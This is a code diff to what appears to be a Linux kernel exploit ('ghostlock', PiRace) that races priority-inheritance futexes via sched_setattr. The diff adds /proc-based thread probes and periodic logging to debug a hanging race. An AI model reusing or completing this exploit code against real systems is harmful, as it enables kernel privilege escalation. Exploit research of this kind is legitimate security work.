@@ -12,7 +12,75 @@
 #include "route/route_policy.hpp"
 #include "session/exploit_session.hpp"
 
+#include <fcntl.h>
+#include <unistd.h>
+#include <cstdio>
+#include <cstring>
+
 using namespace ghostlock;
+
+namespace {
+    /* v8 route_done beat probe: one tid -> "tid=N syscall=<first> wchan=<text>".
+     * The route_done deadline produced 300s of silence in the v8diag runs; the
+     * beat converts that silence into evidence (who is stuck where) without
+     * stdio buffering. Reads fail cleanly on a dead tid. */
+    void probe_tid(int32_t tid, char *dst, size_t cap) {
+        if (dst == nullptr || cap == 0) return;
+        dst[0] = '\0';
+        if (tid <= 0) {
+            snprintf(dst, cap, "-");
+            return;
+        }
+        char path[48];
+        char buf[128];
+        snprintf(path, sizeof(path), "/proc/%d/syscall", tid);
+        int fd = open(path, O_RDONLY);
+        if (fd >= 0) {
+            const ssize_t got = read(fd, buf, sizeof(buf) - 1);
+            close(fd);
+            if (got > 0) {
+                buf[got] = '\0';
+                for (ssize_t i = 0; i < got; i++) {
+                    if (buf[i] == '\n' || buf[i] == '\r') buf[i] = ' ';
+                }
+                size_t len = strlen(buf);
+                while (len > 0 && buf[len - 1] == ' ') buf[--len] = '\0';
+                char first[24] = "";
+                size_t j = 0;
+                while (j < len && buf[j] != ' ' && j + 1 < sizeof(first)) {
+                    first[j] = buf[j];
+                    j++;
+                }
+                first[j] = '\0';
+                snprintf(dst, cap, "tid=%d syscall=%s", tid,
+                         first[0] ? first : "empty");
+            }
+        }
+        if (dst[0] == '\0') {
+            snprintf(dst, cap, "tid=%d syscall=?", tid);
+        }
+        snprintf(path, sizeof(path), "/proc/%d/wchan", tid);
+        fd = open(path, O_RDONLY);
+        if (fd >= 0) {
+            const ssize_t got = read(fd, buf, sizeof(buf) - 1);
+            close(fd);
+            if (got > 0) {
+                buf[got] = '\0';
+                for (ssize_t i = 0; i < got; i++) {
+                    if (buf[i] == '\n' || buf[i] == '\r') buf[i] = ' ';
+                }
+                size_t len = strlen(buf);
+                while (len > 0 && buf[len - 1] == ' ') buf[--len] = '\0';
+                const size_t used = strlen(dst);
+                snprintf(dst + used, cap - used, " wchan=%s",
+                         len > 0 ? buf : "running");
+            }
+        } else {
+            const size_t used = strlen(dst);
+            snprintf(dst + used, cap - used, " wchan=?");
+        }
+    }
+} // namespace
 
 namespace ghostlock::race {
     void *waiter_thread(void *arg) {
@@ -107,6 +175,7 @@ namespace ghostlock::race {
     void *consumer_thread(void *arg) {
         auto *race = static_cast<PiRace *>(arg);
         support::disable_rseq_for_thread();
+        race->consumer_tid.store(static_cast<int32_t>(syscall(SYS_gettid)));
         kernel::pin_to_core(static_cast<size_t>(race->consumer_cpu));
         pr_info("consumer thread running on cpu=%d\n", sched_getcpu());
         int32_t seen = 0;
@@ -141,6 +210,12 @@ namespace ghostlock::race {
                                             ? (calls_this_seq % 19) + 1
                                             : kernel::PSELECT_CONSUMER_NICE;
                     long sched_ret = support::sched_setattr_tid(tid, consumer_nice);
+                    const int32_t sched_errno = (sched_ret != 0) ? errno : 0;
+                    /* v8: this call is the PI-chain trigger; if it never
+                     * returns the chain is stuck inside sched_setattr and the
+                     * beat dump shows syscall=274 (sched_setattr) on this tid. */
+                    pr_info("consumer sched tid=%d nice=%d ret=%ld errno=%d\n",
+                            tid, consumer_nice, sched_ret, sched_errno);
                     if (sched_ret != 0) {
                         struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
                         long fret = support::futex_op(
@@ -210,13 +285,31 @@ ghostlock::route::RouteStatus ghostlock::race::PiRace::run() noexcept {
     SYSCHK(clock_gettime(CLOCK_MONOTONIC, &wait_started));
     const double timeout_ms = static_cast<double>(
         session::g_exploit_session.profile.race_route_done_timeout_ms());
+    int32_t beat_polls = 0;
     while (!route_done.load()) {
-        if (runtime_time::runtime_elapsed_ms(&wait_started) >= timeout_ms) {
+        const double elapsed_ms = runtime_time::runtime_elapsed_ms(&wait_started);
+        if (elapsed_ms >= timeout_ms) {
             return route::RouteStatus{
                 .code = route::ROUTE_DIRTY_FAILURE,
                 .step = 21,
                 .error_number = ETIMEDOUT,
             };
+        }
+        /* v8 beat: every ~2s at the 1ms poll interval, dump both PI workers'
+         * kernel state so a hung route names its culprit instead of dying in
+         * silence at the deadline. */
+        if (++beat_polls >= 2000) {
+            beat_polls = 0;
+            char w_buf[160];
+            char c_buf[160];
+            char o_buf[160];
+            probe_tid(waiter_tid.load(), w_buf, sizeof(w_buf));
+            probe_tid(consumer_tid.load(), c_buf, sizeof(c_buf));
+            probe_tid(owner_tid.load(), o_buf, sizeof(o_buf));
+            pr_info("[route] beat +%.0fs %s %s %s calls=%d success=%d "
+                    "inflight=%d go=%d\n", elapsed_ms / 1000.0, w_buf, c_buf,
+                    o_buf, consumer_calls.load(), consumer_success.load(),
+                    consumer_inflight.load(), consumer_go.load());
         }
         usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
     }
